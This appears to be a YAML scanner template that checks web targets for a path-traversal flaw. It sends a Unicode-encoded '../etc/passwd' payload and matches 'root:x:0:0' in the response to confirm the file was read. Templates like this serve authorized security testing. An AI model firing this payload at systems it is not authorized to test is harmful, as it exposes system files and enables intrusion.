id: lfi3-022
name: 'Traversal to passwd via path'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via path'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      path:
        - '..%u002f..%u002fetc%u002fpasswd'
    matchers:
      - type: word
        part: body
        words:
          - 'root:x:0:0'
